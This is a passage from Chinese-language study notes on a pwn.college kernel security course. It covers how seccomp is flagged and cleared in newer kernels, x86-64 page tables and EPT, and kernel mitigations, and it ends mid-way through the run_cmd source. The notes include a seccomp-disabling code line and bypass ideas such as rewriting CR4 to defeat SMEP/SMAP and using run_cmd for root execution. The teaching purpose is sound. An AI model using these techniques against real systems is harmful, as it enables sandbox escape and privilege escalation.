<p>可以发现定义<code>seccomp</code>是否开启的比特位由<code>thread_info</code>的<code>flags</code>成员转移到了<code>syscall_work</code>成员。</p>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">seccomp<span class="hljs-operator">:</span> Migrate <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> SYSCALL_WORK flag  <br></code></pre></td></tr></table></figure>

<p>在更新建议页面搜索<code>TIF_SECCOMP</code>字符串，根据<code>kernel/seccomp.c</code>的注释可知其被<code>SYSCALL_WORK_SECCOMP</code>取代。</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240305210302.png" srcset="/img/loading.gif" lazyload alt="3"></p>
<p>在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.11-rc1/source/include/linux/thread_info.h#L48">v5.11-rc1的linux源码</a>中查找<code>SYSCALL_WORK_SECCOMP</code>,发现其在<code>include/linux/thread_info.h</code>被定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">syscall_work_bit</span> &#123;</span><br>	SYSCALL_WORK_BIT_SECCOMP, <span class="hljs-comment">//0</span><br>	SYSCALL_WORK_BIT_SYSCALL_TRACEPOINT, <span class="hljs-comment">//1</span><br>	SYSCALL_WORK_BIT_SYSCALL_TRACE, <span class="hljs-comment">//2</span><br>	SYSCALL_WORK_BIT_SYSCALL_EMU, <span class="hljs-comment">//3</span><br>	SYSCALL_WORK_BIT_SYSCALL_AUDIT, <span class="hljs-comment">//4</span><br>	SYSCALL_WORK_BIT_SYSCALL_USER_DISPATCH, <span class="hljs-comment">//5</span><br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SECCOMP		BIT(SYSCALL_WORK_BIT_SECCOMP) <span class="hljs-comment">//最右边第一位是seccomp位</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SYSCALL_TRACEPOINT	BIT(SYSCALL_WORK_BIT_SYSCALL_TRACEPOINT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SYSCALL_TRACE	BIT(SYSCALL_WORK_BIT_SYSCALL_TRACE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SYSCALL_EMU	BIT(SYSCALL_WORK_BIT_SYSCALL_EMU)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SYSCALL_AUDIT	BIT(SYSCALL_WORK_BIT_SYSCALL_AUDIT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_WORK_SYSCALL_USER_DISPATCH BIT(SYSCALL_WORK_BIT_SYSCALL_USER_DISPATCH)</span><br></code></pre></td></tr></table></figure>

<ul>
<li><code>enum</code>：枚举是 C 语言中的一种基本数据类型，用于定义一组具有离散值的常量。第一个枚举成员的默认值为整型的 0，后续枚举成员的值在前一个成员上加 1。</li>
<li><code>BIT</code>：在<code>include/vdso/bits.h</code>中定义了该宏</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BIT(nr)			(UL(1) &lt;&lt; (nr))</span><br></code></pre></td></tr></table></figure>

<p>将1转换为无符号长整型(x64&#x2F;32分别为8&#x2F;4字节)，左移<code>nr</code>位</p>
<p>所以<code>SYSCALL_WORK_SECCOMP</code>是<code>task_struct</code>-&gt;<code>thread_info</code>.<code>syscall_work</code>的右边第一位。</p>
<p>标志位找到了，接下来研究seccomp启动时该标志位的具体作用。在源码中追踪<code>secure_computing</code>和<code>__secure_computing</code>函数。</p>
<p><a href="/include/linux/seccomp.h">&#x2F;include&#x2F;linux&#x2F;seccomp.h</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> __secure_computing(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seccomp_data *sd);<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">secure_computing</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>	<span class="hljs-keyword">if</span> (unlikely(test_syscall_work(SECCOMP)))<br>		<span class="hljs-keyword">return</span>  __secure_computing(<span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><a href="/kernel/seccomp.c">&#x2F;kernel&#x2F;seccomp.c</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __secure_computing(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seccomp_data *sd)<br>&#123;<br>	<span class="hljs-type">int</span> mode = current-&gt;seccomp.mode;<br>	<span class="hljs-type">int</span> this_syscall;<br><br>	<span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_CHECKPOINT_RESTORE) &amp;&amp;<br>	    unlikely(current-&gt;ptrace &amp; PT_SUSPEND_SECCOMP))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	this_syscall = sd ? sd-&gt;nr :<br>		syscall_get_nr(current, current_pt_regs());<br><br>	<span class="hljs-keyword">switch</span> (mode) &#123;<br>	<span class="hljs-keyword">case</span> SECCOMP_MODE_STRICT:<br>		__secure_computing_strict(this_syscall);  <span class="hljs-comment">/* may call do_exit */</span><br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">case</span> SECCOMP_MODE_FILTER:<br>		<span class="hljs-keyword">return</span> __seccomp_filter(this_syscall, sd, <span class="hljs-literal">false</span>);<br>	<span class="hljs-keyword">default</span>:<br>		BUG();<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>发现通过<code>test_syscall_work</code>宏验证<code>SECCOMP</code>位，查看其定义观察验证方式</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/thread_info.h#L139"><code>/include/linux/thread_info.h</code></a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_GENERIC_ENTRY</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> test_syscall_work(fl) \</span><br><span class="hljs-meta">	test_bit(SYSCALL_WORK_BIT_##fl, &amp;current_thread_info()-&gt;syscall_work)</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> test_syscall_work(fl) \</span><br><span class="hljs-meta">	test_ti_thread_flag(current_thread_info(), TIF_##fl)</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">test_ti_thread_flag</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> thread_info *ti, <span class="hljs-type">int</span> flag)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> test_bit(flag, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)&amp;ti-&gt;flags);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，在内核构建的配置选项中如果设置了<code>CONFIG_GENERIC_ENTRY</code>,内核就通过<code>SYSCALL_WORK_BIT_SECCOMP</code>位来验证是否开启seccomp沙箱，否则还是旧版本的通过flags验证。</p>
<p><code>CONFIG_GENERIC_ENTRY</code>通常用于指示是否启用通用的系统调用入口点，这使得内核可以以一种通用的方式处理系统调用，而不需要为每个系统调用都单独实现入口点。该选项默认开启，并且绝大部分情况下都不会禁用。</p>
<p>因此，v5.11版本后内核关闭seccomp的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">current-&gt;thread_info.syscall_work &amp;= ~SYSCALL_WORK_SECCOMP;<br><span class="hljs-comment">//SYSCALL_WORK_SECCOMP = 1 &lt;&lt; SYSCALL_WORK_BIT_SECCOMP = 1</span><br><span class="hljs-comment">//SYSCALL_WORK_BIT_SECCOMP = 0</span><br></code></pre></td></tr></table></figure>



<h3 id="Memory-Management"><a href="#Memory-Management" class="headerlink" title="Memory Management"></a>Memory Management</h3><p><strong>复习：进程内存</strong></p>
<p>每个Linux进程都有一块虚拟内存空间，其中包含：</p>
<ul>
<li>映射后的二进制可执行文件</li>
<li>动态链接库</li>
<li>堆（动态申请的内存）</li>
<li>栈</li>
<li>任何被程序mmap特别映射的内存</li>
<li>some helper regions（不理解这是内存的那部分）</li>
<li>内核空间(在x64中大于0x8000000000000000)</li>
</ul>
<p>对进程来说虚拟内存是脆弱的。</p>
<p>可以通过<code>/proc/self/maps</code>查看当前进程的虚拟内存映射。</p>
<p>物理内存是计算机中的<code>RAM</code>，被整个系统共享。</p>
<p>多个进程的虚拟内存有相同的地址，那么如何将多个进程的内存转换到物理内存而不冲突呢？</p>
<p>解决方案是由操作系统内核负责将维护虚拟内核和物理内存的映射。</p>
<p><strong>虚拟内存和物理内存之间的映射</strong></p>
<p>操作系统会以<code>4kb</code>大小的进程虚拟内存为一个整体映射到物理内存的某个地址，如图</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306192337.png" srcset="/img/loading.gif" lazyload alt="4"></p>
<p>以这种方式分配，在虚拟内存中连续的内存块映射到物理内存时可能是不连续的。例如当p2需要更多内存但紧跟其后的内存已经被占据时，p2的下一个内存块就会映射到更高的非连续物理地址，否则需要转移紧跟的内存块，这将造成巨大的性能开支。</p>
<p>这种方案在内核中的实现称为<code>内核页表</code>。</p>
<p><strong>内核页表</strong></p>
<p>历史上，内核页表(<code>Page Table,PT</code>)是从填满了页表项(<code>Page Table Entries,PTD</code>)的一级页表开始的。</p>
<p>每个页表有512个页表项，一个页表项记录一块<code>4kb(0x1000)</code>大小的内存块的基址，一个4kb内存块就称为一页(<code>page</code>)。因此，一个一级页表最多映射<code>2MB</code>的内存，一个页表的大小在x64&#x2F;32平台上分别为4kb&#x2F;2kb。</p>
<p>相邻页表项对应相邻的虚拟内存页。如图：</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306194632.png" srcset="/img/loading.gif" lazyload alt="5"></p>
<p>只使用一级页表存在一些不方便解决的问题：</p>
<ul>
<li>如何映射非连续的虚拟内存</li>
<li>如果需要映射的连续虚拟内存大于2MB，甚至远大于2MB怎么办</li>
</ul>
<p>解决方案是使用嵌套式的<code>多级页表结构(the multi-level paging struct)</code>,引入二级页表(<code>Page Directory,PD</code>).</p>
<p>二级页表同样包含512个页表项(<code>Page Directory Entries,PDE</code>)，一个表项记录一个一级页表的物理地址，一个二级页表能够映射<code>2MB * 512 = 1GB</code>的内存</p>
<p>通过设置一个特殊的flag位，可以使PDE指向一块2MB的物理内存，而不是指向PT</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306202617.png" srcset="/img/loading.gif" lazyload alt="6"></p>
<p>如果物理内存大于1GB，就继续引入三级页表(<code>Page Directory Page Table,PDPT</code>)</p>
<p>三级页表中也有512个页表项(<code>Page Directory Pointers,PDP</code>)，总共可以映射512G的内存。</p>
<p>同样的，通过设置特殊的flag位，可以使页表项PDP指向1GB的物理内存，而不是指向PD。</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306203800.png" srcset="/img/loading.gif" lazyload alt="7"></p>
<p>以此类推，我们可以建立四级页表(<code>Page Map Level 4,PML4</code>)，五级页表(<code>Page Map Level 5,PML5</code>)…..,它们可以映射的内存大小是指数增长的(每级x512)。</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240306204054.png" srcset="/img/loading.gif" lazyload alt="8"></p>
<p><strong>进程中的虚拟地址与页表中索引间的转换</strong></p>
<p>进程虚拟地址和物理地址通过页表的索引进行转换。</p>
<p>注意：可定位的内存地址只有前48比特(0-0x7FFFFFFFFFFF)，0x800000000000之后是内核空间</p>
<p>以0x7fff47d4c123为例，将其转换为二进制形式</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">0111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">1111 </span><span class="hljs-number">0100 </span><span class="hljs-number">0111 </span><span class="hljs-number">1101 </span><span class="hljs-number">0100 </span><span class="hljs-number">1100 </span><span class="hljs-number">0001 </span><span class="hljs-number">0010 </span><span class="hljs-number">0011</span><br></code></pre></td></tr></table></figure>

<p>在x64架构下，一个<code>Page</code>占<code>4kb</code>，对应二进制<code>1 0000 0000 0000</code>，每个字节都要占据一个索引位。所以一个页的索引总数是<code>4096</code>,范围是<code>0 - 1111 1111 1111 1111</code>，在虚拟内存地址中占12个二进制位。</p>
<p>一个页表有512项，8字节一项，一共也是<code>4kb</code>,但是对页表来说每一项需要一个索引而不是1比特对应1索引。因此一个页表的索引总数是<code>512</code>,范围是<code>0-1 1111 1111</code>，在虚拟内存地址中占9个二进制位。</p>
<p>因此对0x7fff47d4c123的<code>地址-索引</code>划分如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0111</span> <span class="hljs-number">1111</span> <span class="hljs-number">1</span>		<span class="hljs-comment">//A:Page Map Level 4中的索引</span><br><span class="hljs-number">111</span> <span class="hljs-number">1111</span> <span class="hljs-number">01</span>		<span class="hljs-comment">//B:Page Directory Page Table中的索引</span><br><span class="hljs-number">00</span> <span class="hljs-number">0111</span> <span class="hljs-number">110</span>		<span class="hljs-comment">//C:Page Directory中的索引</span><br><span class="hljs-number">1</span> <span class="hljs-number">0100</span> <span class="hljs-number">1100</span>		<span class="hljs-comment">//D:Page Table中的索引 </span><br><span class="hljs-number">0001</span> <span class="hljs-number">0010</span> <span class="hljs-number">0011</span>	<span class="hljs-comment">//E:Page中的索引</span><br></code></pre></td></tr></table></figure>

<p>因此类似<code>mov rax,[rbx]</code>可以转换成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">rax = *(long *)(PML4[A][B][c][D])[E]<br></code></pre></td></tr></table></figure>



<p><strong>进程隔离 - 进程虚拟内存到物理内存</strong></p>
<p>每个进程有其独立的PML4，获取了PML4的地址就能根据索引获取该进程映射的所有物理内存地址，那么如何获取PML4的地址呢？</p>
<p><code>CR3</code>寄存器保存了PML4的物理地址。</p>
<p>并且在<code>Introduction</code>一节中已经讲过，<code>CR3</code>寄存器只能在ring0权限下通过<code>mov</code>指令访问。</p>
<p>题外话：</p>
<p>除了<code>CR3</code>,还有很多Control Registers用来设置处理器选项(比如设置模式为32位还是64位)以及其它很多疯狂的东西。如果感兴趣，可以访问:</p>
<p><a target="_blank" rel="noopener" href="https://wiki.osdev.org/CPU_Registers_x86">https://wiki.osdev.org/CPU_Registers_x86</a></p>
<p><strong>虚拟机隔离 - 内存虚拟化</strong></p>
<p>如何隔离多个虚拟机？客户机内核应当如何访问物理内存？</p>
<p>为了解决虚拟机内存到物理内存的转换以及虚拟机间的隔离等问题，引入了通过<code>硬件辅助虚拟化</code>实现的扩展页表<code>The Extended Page Table,EPT</code>技术。</p>
<p>一些概念及缩写：</p>
<ul>
<li>客户机(虚拟机)，<code>Guest VM</code>或<code>Guest</code></li>
<li>宿主机物理内存地址，<code>Host Physical Address,HPA</code></li>
<li>宿主机虚拟内存地址，<code>Host Virtual Address,HVA</code></li>
<li>客户机物理内存地址，<code>Guest Physical Address,GPA</code></li>
<li>客户机虚拟内存地址，<code>Guest Virtual Address,GVA</code></li>
<li>虚拟机管理程序，<code>Virtual Machine Monitor,VMM</code></li>
<li>虚拟机控制结构，<code>Virtual Machine Control Structure,VMCS</code></li>
</ul>
<p><code>EPT</code>是Intel为实现内存虚拟化专门增加的硬件特性。EPT技术的核心概念是在处理器硬件级别上增加了一组额外的页表、对应的内存管理器<code>EPT MMU</code>和对应的缓存<code>EPT TLB</code>，用于将<code>GVA</code>映射到<code>HPA</code>，而不用经过<code>GPA -&gt; HVA -&gt; HPA</code>三个阶段的地址转换。</p>
<p>整体架构如下图，客户机由<code>VMM</code>管理，<code>VMM</code>或<code>EPT MMU</code>管理<code>EPT</code>实现<code>GPA</code>和<code>HPA</code>的转换从而模拟出所有<code>Guest CPU</code>需要访问的<code>GPA</code>。</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240309102937.png" srcset="/img/loading.gif" lazyload alt="9"></p>
<p>具体的转换过程如下。</p>
<p><code>GPA</code> -&gt; <code>HPA</code></p>
<p><code>GPA</code>转为<code>HPA</code>的过程和<code>HVA</code>转为<code>HPA</code>的过程十分类似。<code>EPT</code>也包含四级页表，其结构和其它内核页表相同。<code>GPA</code>也由4个索引(Index)和1个<code>Page Offset</code>构成，不同点在于<code>EPT PML4</code>的基址通过<code>VMCS</code>的<code>EPTP</code>字段获取，有了这些信息，就和<code>HVA</code>到<code>HPA</code>的转换一样由一级级页表索引到某个页表中的<code>HPA</code>。<code>EPT</code>页表和<code>VMCS</code>都存放在<code>Host</code>物理内存中。</p>
<p><code>GVA</code> -&gt; <code>HPA</code></p>
<p>注意：<code>Guest</code>的内核页表事实上存放在<code>Host</code>物理内存中。</p>
<ol>
<li><p>当<code>Guest</code>需要将<code>GVA</code>转换成<code>GPA</code>，先获取<code>GVA</code>中的4个<code>Index</code>和1个<code>Page Offset</code>，通过CR3寄存器寻址PML4基址的<code>GPA</code>。</p>
</li>
<li><p>由<code>EPT MMU</code>将PML4基址的<code>GPA</code>转换为PML4基址的<code>HPA</code>，结合<code>Index4</code>获取<code>PDPT</code>基址的<code>GPA</code></p>
</li>
<li><p><code>PDPT</code>基址的<code>GPA</code>经过<code>EPT</code>转换为<code>PDPT</code>基址的<code>HPA</code>，结合<code>Index3</code>获取<code>PD</code>基址的<code>GPA</code></p>
</li>
<li><p>以此类推，得到<code>GVA</code>对应的<code>HPA</code>，如下图：</p>
</li>
</ol>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240309124009.png" srcset="/img/loading.gif" lazyload alt="10"></p>
<p><strong>性能优化 - 页表项缓存TLB和内存管理器MMU</strong></p>
<p>以上过程涉及到很多转换，如果这些转换都由内核来完成，速度会很慢，因此需要TLB和MMU进行性能优化。TLB(EPT TLB)和MMU(EPT MMU)都是CPU内部的组件，拥有较高的运行性能。</p>
<ul>
<li>页表项缓存<code>Translation Lookaside Buffer,TLB</code>，用于存储程序中最常访问的页表项，以加快虚拟地址到物理地址的转换速度。</li>
<li><code>EPT TLB</code>，针对虚拟化进行优化后的TLB。</li>
<li>内存管理器<code>Memory Management Unit,MMU</code>，负责将虚拟内存实际翻译成物理内存。</li>
<li><code>EPT MMU</code>， Intel 处理器架构的一种特性，在硬件层面上提供了增强的虚拟化支持。扩展了 MMU 的功能，允许处理器直接管理虚拟机内部的内存映射，而无需通过 VMM（Virtual Machine Monitor，虚拟机监视器）介入。</li>
</ul>
<p><strong>Other Arch</strong></p>
<p>arm：CR3寄存器被TTBR0(用户空间)和TTBR1(内核空间)取代，各级页表被称为<code>Level0</code>、<code>Level1</code>、<code>Level2</code>、<code>Level3</code>。</p>
<p>Linux通用术语：</p>
<p>PML4 &#x3D; PGD(Page Gloval Diretory)</p>
<p>PDPT &#x3D; PUD(Page Upper Directory)</p>
<p>PD &#x3D; PMD(Page Mid-Level Directory)</p>
<p>PT &#x3D; PT(Page Table)</p>
<p>Linux需要<code>MMU</code>来支持虚拟内存机制，FreeRTOS、VxWorks、ucOS等不需要<code>MMU</code>。</p>
<h4 id="高版本内核中的五级页表-新增P4D"><a href="#高版本内核中的五级页表-新增P4D" class="headerlink" title="高版本内核中的五级页表(新增P4D)"></a>高版本内核中的五级页表(新增P4D)</h4><p>研究获取子进程虚拟内存的物理地址时发现有的代码中出现了<code>P4D</code>。查阅资料得知较新版本的Linux内核已经支持<code>五级页表</code>，在PGD和PUD之间增加了一个页表，称为P4D。pwncollege的实验环境中是五级页表。</p>
<p><strong>The Kernel Sees ALL</strong></p>
<p>The Old Way:</p>
<p>某些应用程序（Xorg）需要从用户空间直接访问物理内存。 存在特殊文件<code>/dev/mem</code>来提供此访问。 过去，如果攻击者具有root用户访问权限，则可以从该文件查看和更改内核内存。 引入了<code>CONFIG_STRICT_DEVMEM</code>内核选项以阻止对非设备存储器的访问。</p>
<p>The New Way: </p>
<p>在版本较新的内核中，想要获取物理内存，就必须从内核访问。</p>
<p>为了便于访问，映射为内核虚拟内存的物理内存是<strong>连续</strong>的。</p>
<p><code>phys_to_virt</code> 和 <code>virt_to_phys</code>分别用于将物理地址转换为内核虚拟地址和将内核虚拟地址转换为物理地址。</p>
<p>其定义如下(内核版本v6.7.9,<a href="/arch/x86/include/asm/io.h">&#x2F;arch&#x2F;x86&#x2F;include&#x2F;asm&#x2F;io.h</a>)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">phys_addr_t</span> <span class="hljs-title function_">virt_to_phys</span><span class="hljs-params">(<span class="hljs-keyword">volatile</span> <span class="hljs-type">void</span> *address)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> __pa(address);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">phys_to_virt</span><span class="hljs-params">(<span class="hljs-type">phys_addr_t</span> address)</span><br>&#123;<br>	<span class="hljs-keyword">return</span> __va(address);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __va(x)			((void *)((unsigned long)(x)+PAGE_OFFSET))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pa(x)		__phys_addr((unsigned long)(x))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __phys_addr(x)		__phys_addr_nodebug(x)</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __phys_addr_nodebug(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> x)<br>&#123;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> y = x - __START_KERNEL_map;<br><br>	<span class="hljs-comment">/* use the carry flag to determine if x was &lt; __START_KERNEL_map */</span><br>	x = y + ((x &gt; y) ? phys_base : (__START_KERNEL_map - PAGE_OFFSET));<br><br>	<span class="hljs-keyword">return</span> x;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>在黑客行为中，内核是非常流行和该价值的攻击目标(比如内核漏洞利用是攻击智能手机非常经典的一环)。采取对内核攻击的缓解措施十分重要。</p>
<p><a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/linux-kernel-%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%92%8C%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">参考文章</a></p>
<p><strong>内核态中一些和用户态相似的保护</strong></p>
<ul>
<li><code>Stack canary</code>,保护栈。</li>
<li><code>kASLR</code>,在<code>boot</code>时将内核空间重定位至随机基址。可依据每次启动后<code>/proc/kallsyms</code>中函数符号的地址是否不变判断是否开启<code>kASLR</code>。</li>
<li><code>NX</code>，堆栈默认不可执行。</li>
</ul>
<p>当不开启 <code>kaslr</code> 的时候，道场中默认的内核虚拟机基地址是：<code>0xffffffff81000000</code></p>
<p>内核的设计哲学:<a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/security/self-protection.txt">https://www.kernel.org/doc/Documentation/security/self-protection.txt</a></p>
<p>对于上面这些常见的保护已经有了对应的绕过思路：</p>
<ul>
<li><code>Stack canary</code>:泄露canary</li>
<li><code>kASLR</code>:泄露内核符号地址，计算内核基址</li>
<li>堆栈不可执行：ROP</li>
</ul>
<p>于是内核中又引入了KASLR的加强版 - <code>Function Granular KASLR,FGKASLR</code>。在开启了<code>FGASLR</code>的内核中，进行了更复杂的随机化，即使泄露了内核的程序基地址也不能调用任意的内核函数，需要通过琐碎的地址泄露来进行绕过，具体可参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/131631111">该文章</a>。</p>
<p><strong>内核态特有的保护措施</strong></p>
<ul>
<li><code>Supervisor Mode Execution,SMEP</code></li>
</ul>
<p>用户代码不可执行，禁止内核态代码跳转执行用户态代码。</p>
<p>正常内核默认开启，在qemu的 <code>-cpu</code> 选项中添加 <code>+smep</code> 来开启。</p>
<ul>
<li><code>Supervisor Mode Access Protection,SMAP</code></li>
</ul>
<p>用户数据不可访问，禁止内核代码读写用户内存数据。</p>
<p>  正常内核默认开启，在qemu的 <code>-cpu</code> 选项中添加 <code>+smap</code> 来开启 。</p>
<ul>
<li><p>通过查看<code>/proc/cpuinfo</code>是否包含smep&#x2F;smap字段判断是否开启该保护</p>
</li>
<li><p><code>SMEP</code>&#x2F;<code>SMAP</code>攻击思路</p>
</li>
</ul>
<p>1.通过设置<code>RFLAGS</code>寄存器中的<code>AC</code>位为1可以无视<code>SMAP</code>访问用户态内存，可以通过<code>stac</code>和<code>clac</code>两个R0层指令来管理该位。内核态函数<code>copy_from_user</code>和<code>copy_to_user</code>就是通过设置<code>AC</code>位来访问用户空间的。</p>
<p>2.通过执行内核中对应的gadget来修改CR4寄存器为0x6f0 (011011110000b)使<code>SMEP</code>和<code>SMAP</code>失效。</p>
<p><code>cr4</code>寄存器第20位用于标记是否开启<code>SMEP</code>。</p>
<p><code>cr4</code>寄存器第21位用于标记是否开启<code>SMAP</code>。</p>
<p><img src="/2024/03/27/PwnCollege-SystemSecurity-Kernel/QQ%E6%88%AA%E5%9B%BE20240310165300.png" srcset="/img/loading.gif" lazyload alt="11"></p>
<p>3.通过内核态函数<code>run_cmd(char *cmd)</code>可以以root权限执行用户态命令。</p>
<p>源码：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/ident/run_cmd">https://elixir.bootlin.com/linux/latest/ident/run_cmd</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">run_cmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> 